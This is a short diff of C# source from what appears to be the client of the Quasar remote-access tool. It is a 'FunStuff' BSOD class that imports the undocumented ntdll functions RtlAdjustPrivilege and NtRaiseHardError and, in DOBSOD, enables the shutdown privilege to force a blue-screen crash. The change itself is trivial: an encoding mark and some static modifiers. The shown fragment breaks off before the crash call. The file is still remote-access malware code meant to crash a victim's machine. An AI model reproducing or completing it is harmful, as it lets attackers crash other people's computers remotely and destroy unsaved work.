@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.Collections.Generic;
 using System.Linq;
 using System.Runtime.InteropServices;
@@ -7,7 +7,7 @@ using System.Threading.Tasks;
 
 namespace Quasar.Client.FunStuff
 {
-    public static class BSOD
+    public class BSOD
     {
         [DllImport("ntdll.dll")]
         private static extern uint RtlAdjustPrivilege(int Privilege, bool Enable, bool CurrentThread, out bool Enabled);
@@ -15,7 +15,7 @@ namespace Quasar.Client.FunStuff
         private static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);
         public
 
-        static unsafe void DOBSOD()
+        unsafe void DOBSOD()
         {
             bool t1;
             RtlAdjustPrivilege(19, true, false, out t1);
